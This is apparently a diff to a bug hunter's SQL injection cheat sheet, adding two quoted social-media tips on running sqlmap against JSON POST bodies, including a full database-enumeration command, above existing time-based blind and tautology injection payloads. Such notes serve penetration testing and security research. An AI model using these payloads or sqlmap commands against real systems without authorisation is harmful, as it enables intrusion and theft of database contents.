@@ -1,6 +1,16 @@
 SQL
 ====
 
+N$
+@nav1n0x
+·
+Nov 4, 2023
+SQLi Tip - If you're able to find a JSON POST-based potential SQL injection (SQLi), remember to execute the SQLMAP query with -u and --data using JSON input. I've found more success using this method in SQLMap than when using a request file. #
+SQL Injection on JSON body POST request. It took me some time, but finally found the right technique and injection point. ``sqlmap -r request.txt --level=5 --risk=3 --force-ssl --ignore-code=500 --dbs`` 
+
+
+
+
 XOR(SELECT(0)FROM(SELECT(SLEEP(5)))a)XOR'Z
 
 1 or 1=1' --
